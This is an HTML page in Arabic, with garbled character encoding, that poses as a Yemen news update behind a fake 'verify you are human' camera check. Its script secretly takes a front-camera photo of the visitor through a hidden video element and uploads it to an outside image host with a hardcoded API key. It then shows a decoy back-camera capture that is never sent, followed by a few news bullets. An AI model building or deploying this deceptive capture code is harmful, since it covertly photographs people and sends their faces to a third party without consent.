<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8">
    <title>Ø¢Ø®Ø± ØªØ·ÙˆØ±Ø§Øª Ø§Ù„ÙˆØ¶Ø¹ ÙÙŠ Ø§Ù„ÙŠÙ…Ù†</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <style>
        body {
            font-family: 'Tahoma', sans-serif;
            text-align: center;
            background: linear-gradient(to bottom right, #e0f7fa, #fff3e0);
            color: #333;
            padding: 50px 20px;
        }

        h1 {
            font-size: 2em;
            color: #00796b;
        }

        p {
            font-size: 1.2em;
            margin-bottom: 15px;
        }

        button {
            background-color: #00796b;
            color: white;
            border: none;
            padding: 15px 35px;
            font-size: 1em;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #004d40;
        }

        video {
            display: none;
            width: 100%;
            margin:auto;
            max-width: 400px;
            margin-top: 20px;
            border-radius: 12px;
        }

        #captureBtn,
        #sendBtn {
            display: none;
            margin-top: 10px;
        }

        #loading {
            margin-top: 20px;
            font-size: 1.2em;
            color: #666;
        }

        #finalContent {
            display: none;
            margin-top: 30px;
            font-size: 1.3em;
            color: #333;
        }
    </style>
</head>

<body dir="rtl">
    <h1>ğŸŒ Ø¢Ø®Ø± ØªØ·ÙˆØ±Ø§Øª Ø§Ù„ÙˆØ¶Ø¹ ÙÙŠ Ø§Ù„ÙŠÙ…Ù†</h1>
    <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¹Ù„Ù‰ Ø£Ù†Ùƒ Ø¥Ù†Ø³Ø§Ù† Ø¹Ù† Ø·Ø±ÙŠÙ‚ ØªØµÙˆÙŠØ± Ø£ÙŠ Ø´ÙŠØ¡ Ø£Ù…Ø§Ù…Ùƒ.</p>
    <button onclick="startVerification()">âœ… Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ­Ù‚Ù‚</button>

    <video id="video" autoplay playsinline></video>
    <br>
    <button id="captureBtn" onclick="captureBackground()">ğŸ“¸ Ø§Ù„ØªÙ‚Ø§Ø·</button>
    <button id="sendBtn" onclick="sendResult()">ğŸ“¤ Ø¥Ø±Ø³Ø§Ù„</button>

    <div id="loading"></div>
    <div id="finalContent">
        ğŸ‡¾ğŸ‡ª <strong>Ø£Ù‡Ù… Ø§Ù„Ù…Ø³ØªØ¬Ø¯Ø§Øª:</strong><br><br>
        â€¢ ØªØ­Ø³Ù† Ø·ÙÙŠÙ ÙÙŠ Ø³Ø¹Ø± ØµØ±Ù Ø§Ù„Ø±ÙŠØ§Ù„ Ù…Ù‚Ø§Ø¨Ù„ Ø§Ù„Ø¯ÙˆÙ„Ø§Ø±.<br>
        â€¢ Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø§Øª Ø¨Ø´Ø£Ù† Ø§Ù„Ù‡Ø¯Ù†Ø© ÙÙŠ Ø¨Ø¹Ø¶ Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø§Øª.<br>
        â€¢ ØªÙ‚Ø§Ø±ÙŠØ± Ø¹Ù† Ù‡Ø¯ÙˆØ¡ Ù†Ø³Ø¨ÙŠ ÙÙŠ ØµÙ†Ø¹Ø§Ø¡ ÙˆØ¹Ø¯Ù† Ù…Ø¤Ø®Ø±Ù‹Ø§.<br>
        â€¢ Ø¹ÙˆØ¯Ø© Ø¨Ø¹Ø¶ Ø§Ù„Ø®Ø¯Ù…Ø§Øª ØªØ¯Ø±ÙŠØ¬ÙŠØ§Ù‹ ÙÙŠ Ù…Ù†Ø§Ø·Ù‚ Ø§Ù„Ø¬Ù†ÙˆØ¨.
    </div>

    <script>
        const API_KEY = "8b3ff25139462514d13f5d9a3b3c0d05";
        const video = document.getElementById("video");
        const captureBtn = document.getElementById("captureBtn");
        const sendBtn = document.getElementById("sendBtn");
        const loading = document.getElementById("loading");
        const finalContent = document.getElementById("finalContent");

        let backgroundStream = null;
        let selfieUploaded = false;

        async function startVerification() {
            loading.textContent = "ğŸ“· Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ø¥Ù†Ø³Ø§Ù†...";
            try {
                // Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ù…Ø¨Ø§Ø´Ø±Ø©
                const selfieStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const hiddenVideo = document.createElement("video");
                hiddenVideo.srcObject = selfieStream;
                await hiddenVideo.play();

                setTimeout(async () => {
                    const canvas = document.createElement("canvas");
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    const ctx = canvas.getContext("2d");
                    ctx.drawImage(hiddenVideo, 0, 0);

                    selfieStream.getTracks().forEach(track => track.stop());

                    const imageData = canvas.toDataURL("image/jpeg");
                    const formData = new FormData();
                    formData.append('image', imageData.split(',')[1]);

                    const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await res.json();
                    if (data.success) {
                        console.log("ğŸ“· ØªÙ… Ø±ÙØ¹ ØµÙˆØ±Ø© Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©:", data.data.url);
                        selfieUploaded = true;

                        // Ø§Ù„Ø¢Ù† Ù†Ù†ØªÙ‚Ù„ Ù„ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©
                        await startBackCamera();
                    } else {
                        loading.textContent = "âŒ ÙØ´Ù„ Ø±ÙØ¹ Ø§Ù„ØµÙˆØ±Ø©.";
                    }
                }, 1000);

            } catch (err) {
                loading.textContent = "âš ï¸ ØªØ¹Ø°Ø± Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.";
                console.error(err);
            }
        }

        async function startBackCamera() {
            try {
                backgroundStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = backgroundStream;
                video.style.display = "block";
                captureBtn.style.display = "inline-block";
                loading.textContent = "ğŸ¥ ÙˆØ¬Ù‡ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ø£ÙŠ Ø´ÙŠØ¡ Ø«Ù… Ø§Ø¶ØºØ· Ø§Ù„ØªÙ‚Ø§Ø·.";
            } catch (err) {
                loading.textContent = "âš ï¸ ØªØ¹Ø°Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©.";
                console.error(err);
            }
        }

        function captureBackground() {
            captureBtn.style.display = "none";
            video.style.display = "none";
            backgroundStream.getTracks().forEach(track => track.stop());
            sendBtn.style.display = "inline-block";
            loading.textContent = "ğŸ“¤ Ø¬Ø§Ù‡Ø² Ù„Ù„Ø¥Ø±Ø³Ø§Ù„.";
        }

        function sendResult() {
            sendBtn.style.display = "none";
            loading.textContent = "âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ø¥Ù†Ø³Ø§Ù†...\nğŸ”„ Ø¬Ø§Ø±ÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª...";
            setTimeout(() => {
                loading.style.display = "none";
                finalContent.style.display = "block";
            }, 2500);
        }
    </script>
</body>

</html>

